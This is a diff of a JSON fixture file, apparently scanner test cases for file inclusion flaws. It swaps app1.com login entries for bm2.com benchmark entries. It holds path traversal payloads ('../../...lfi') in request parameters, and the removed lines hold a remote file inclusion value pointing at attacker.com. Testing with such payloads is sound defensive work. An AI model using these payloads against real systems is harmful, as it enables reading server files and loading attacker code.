@@ -1,18 +1,20 @@
 [
   {
-    "url": "https://app1.com/users/login.php", 
-    "action": "https://app1.com/admin/index.php", 
+    "url": "http://bm2.com/case2/bm.php", 
+    "action": "http://bm2.com/case2/bm.php", 
     "parameter": {
-      "page": "http://attacker.com/a"
+      "username": "../../../../../../../../../../../../../../lfi", 
+      "null": ""
     }, 
-    "method": "get"
+    "method": "GET"
   }, 
   {
-    "url": "https://app1.com/users/login.php", 
-    "action": "https://app1.com/admin/index.php", 
+    "url": "http://bm2.com/case2/bm.php", 
+    "action": "http://bm2.com/case2/bm.php", 
     "parameter": {
-      "page": "../../../../../../../../../../../../../../lfi"
+      "username": "../../../../../../../../../../../../../../lfi", 
+      "null": ""
     }, 
-    "method": "get"
+    "method": "GET"
   }
 ]
